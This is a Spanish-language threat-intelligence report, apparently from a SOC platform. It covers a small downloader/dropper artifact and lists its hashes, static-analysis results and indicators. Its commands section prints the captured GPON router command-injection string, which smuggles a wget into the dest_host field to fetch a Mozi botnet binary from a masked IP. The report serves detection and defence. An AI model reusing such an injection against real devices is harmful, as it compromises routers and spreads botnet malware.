# 🧬 Payload Analysis

`8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3`
- **MD5:** `ba1b0e31d81cc635a9b7287b1357e3c2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 111.92.152.XXX | static_analysis |
| url | hxxp://111.92.152.XXX:57968/Mozi.m+-O+- | strings |
| hash | 8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80 | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
